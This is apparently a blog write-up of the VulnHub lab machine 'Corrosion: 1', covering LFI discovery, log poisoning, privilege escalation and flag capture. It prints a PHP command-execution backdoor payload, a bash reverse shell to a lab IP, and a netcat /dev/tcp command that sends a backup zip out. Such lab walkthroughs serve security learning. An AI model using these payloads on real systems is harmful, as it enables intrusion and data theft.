<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><strong>Name</strong>: Corrosion: 1</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Date release</strong>: 31 Jul 2021</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Author</strong>:&nbsp;<a href="https://www.vulnhub.com/author/proxy-programmer,812/" target="_blank" rel="noreferrer noopener">Proxy Programmer</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Series</strong>:&nbsp;<a href="https://www.vulnhub.com/series/corrosion,491/" target="_blank" rel="noreferrer noopener">Corrosion</a></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Download the machine:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://www.vulnhub.com/entry/corrosion-1,730/" target="_blank" rel="noreferrer noopener">https://www.vulnhub.com/entry/corrosion-1,730/</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center","backgroundColor":"vivid-purple","fontSize":"small"} -->
<p class="has-text-align-center has-vivid-purple-background-color has-background has-small-font-size">Overview</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>Enumeration will lead a blog-post folder, enumerate the folder again to find an archive folder</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Use ffuf to find a URL paramaeter for a LFI vulnerablity</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Log poisoning vulnerability is present</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Inject a php backdoor into the logs</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Attached a reverse shell into the php backdoor</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Find for a user backup zip and transfer it to attacking machine</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Crack the zip folder with john to gain some creds and other files</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Once user access is gain via SSH check for sudo permissions</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Write a binary and overwrite the main file to get root access</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center","backgroundColor":"luminous-vivid-amber","fontSize":"small"} -->
<p class="has-text-align-center has-luminous-vivid-amber-background-color has-background has-small-font-size"><strong>Enumeration</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Run nmap scan to find for open ports.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7208,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-562.png?w=945" alt="" class="wp-image-7208"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Run a gobuster scan to find for hidden directories. </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7209,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-563.png?w=1024" alt="" class="wp-image-7209"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Web server</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7213,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-566.png?w=820" alt="" class="wp-image-7213"/><figcaption class="wp-element-caption">Found a potential user name.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>/tasks</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7210,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-564.png?w=587" alt="" class="wp-image-7210"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":7211,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-565.png?w=626" alt="" class="wp-image-7211"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Couldn't find any more cluse so I decided to enumerate the blog-post directory.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7214,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-567.png?w=1024" alt="" class="wp-image-7214"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Found an archives folder. That contain a php log file.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7216,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-568.png?w=609" alt="" class="wp-image-7216"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":7218,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-569.png?w=741" alt="" class="wp-image-7218"/><figcaption class="wp-element-caption">Let's see if we can fuzz the URL parameter to get an access for LFI. Use the ffuf tool.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:image {"id":7220,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-570.png?w=1024" alt="" class="wp-image-7220"/><figcaption class="wp-element-caption">Found a parameter.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Let's test the payload.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7222,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-571.png?w=954" alt="" class="wp-image-7222"/><figcaption class="wp-element-caption">It works.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Since the to-do list indicates to change the authentication of the log file , let's see if we can access them.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7225,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-573.png?w=1024" alt="" class="wp-image-7225"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Let's test a log poisoning attack with a random username.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7224,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-572.png?w=1010" alt="" class="wp-image-7224"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Since log poisoning is a possibility let's inject it with a backdoor. You read more of it <a href="https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d" data-type="URL" data-id="https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d" target="_blank" rel="noreferrer noopener">here</a>.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><em>Payload : </em>'‘&lt;?php system($_GET&#91;"cmd"]); ?>’'</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>SSH to the machine with the above payload.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7228,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-574.png?w=1024" alt="" class="wp-image-7228"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Payload is injected.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7229,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-575.png?w=1022" alt="" class="wp-image-7229"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Let's enter id to test the payload.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7232,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-577.png?w=811" alt="" class="wp-image-7232"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":7231,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-576.png?w=1024" alt="" class="wp-image-7231"/><figcaption class="wp-element-caption">we are able to use command injection.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Now inject a bash revershell. Make sure to URL encode the file and start a netcat listener.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>bash -c 'bash -i >&amp; /dev/tcp/192.168.18.8/1234 0>&amp;1'</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center","backgroundColor":"vivid-cyan-blue","fontSize":"small"} -->
<p class="has-text-align-center has-vivid-cyan-blue-background-color has-background has-small-font-size"><strong>Foothold</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>User access gained.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7234,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-578.png?w=863" alt="" class="wp-image-7234"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>I upgraded the shell and tried to access the randy folder but we don't have permissions. We don't have sudo permissions either.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7235,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-579.png?w=731" alt="" class="wp-image-7235"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>After some time enumerating the folders , I found a user backup zip file. I used netcat to transfer the file to my local machine.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On your local machine use this command to recive the file : nc -nlvp 4444 > user.zip</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>On the target machine use this to send the file : cat user_backup.zip > /dev/tcp/192.168.18.8/4444</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7237,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-580.png?w=881" alt="" class="wp-image-7237"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Now that we have the file , it is password protected. So we need to break into it.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Use zip2john | tee hash and then john to crack the hash.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7239,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-581.png?w=1024" alt="" class="wp-image-7239"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Unzip the file and we get the following.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7241,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-582.png?w=438" alt="" class="wp-image-7241"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Read the password and we are able to SSH into the randy user.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7243,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-583.png?w=1024" alt="" class="wp-image-7243"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Check sudo permissions.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7245,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-584.png?w=1024" alt="" class="wp-image-7245"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Found the first flag.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7247,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-585.png?w=355" alt="" class="wp-image-7247"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph {"align":"center","backgroundColor":"black","textColor":"white","fontSize":"small"} -->
<p class="has-text-align-center has-white-color has-black-background-color has-text-color has-background has-small-font-size"><strong>Privilege escalation</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>We head to the tools folder and found the easysysinfo tools.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7248,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-586.png?w=669" alt="" class="wp-image-7248"/><figcaption class="wp-element-caption">However they are root protected and we aren't able to edit the file.</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>I remember seeing a easysysinfo file in the zipped file but it is written in C instead of python.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7250,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-587.png?w=457" alt="" class="wp-image-7250"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Let's replicate this file but add a bash shell inside the code.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7252,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-588.png?w=485" alt="" class="wp-image-7252"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Compile the file and set the output as the easysysinfo main file to overwrite it.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7254,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-589.png?w=613" alt="" class="wp-image-7254"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Root access will be gained.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":7255,"sizeSlug":"large","linkDestination":"none"} -->
<figure class="wp-block-image size-large"><img src="https://persecure.files.wordpress.com/2022/10/image-590.png?w=671" alt="" class="wp-image-7255"/></figure>
<!-- /wp:image -->
